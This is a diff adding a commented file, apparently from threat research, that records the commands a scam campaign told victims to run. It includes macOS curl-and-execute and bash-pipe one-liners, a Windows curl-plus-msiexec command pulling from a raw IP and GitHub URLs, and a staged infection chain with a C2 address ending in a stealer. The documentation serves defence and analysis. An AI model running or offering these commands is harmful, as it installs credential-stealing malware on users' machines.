@@ -1,0 +1,28 @@
+# ===================================================================
+# ⚠️ MALICIOUS ARTIFACT — DO NOT EXECUTE
+# ===================================================================
+# These are the EXACT commands victims are told to run in the scam.
+# Running them will download and execute malware on your machine.
+#
+# Source: Scam pages on Reddit, Telegram, Discord, GitHub
+# ===================================================================
+
+## macOS — Original Scam Command
+## This downloads the Mach-O stealer binary, removes quarantine, and runs it:
+# cd $TMPDIR && curl -O http://45.137.99.121/claude && xattr -c claude && chmod +x claude && ./claude
+
+## Alternative macOS command (via GitHub raw URL):
+# /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/ai-gen-profi/chatgpt-trial-gen/main/gpt)"
+
+## Windows — Original Scam Command
+## This downloads the MSI installer and executes it:
+# curl -Lo %temp%\s.msi https://raw.githubusercontent.com/ai-gen-profi/chatgpt-trial-gen/main/gpt.msi && msiexec /i %temp%\s.msi
+
+## What happens after execution:
+## 1. MSI installs to %LOCALAPPDATA%\<name>\
+## 2. Custom Action runs kilo_piece66.cmd (hidden)
+## 3. kilo_piece66.cmd launches lima26.ps1 (hidden PowerShell)
+## 4. lima26.ps1 installs Scoop → WinGet → Deno (legitimate tools abused)
+## 5. Deno loads Stage 2 JS from C2: http://ms-telemetry-gateway-us.com/acca66ea4f9f6efe.js
+## 6. Stage 2 establishes persistence, fingerprint, and downloads Stage 3
+## 7. Stage 3 is the actual stealer (per-victim generated, not recoverable statically)
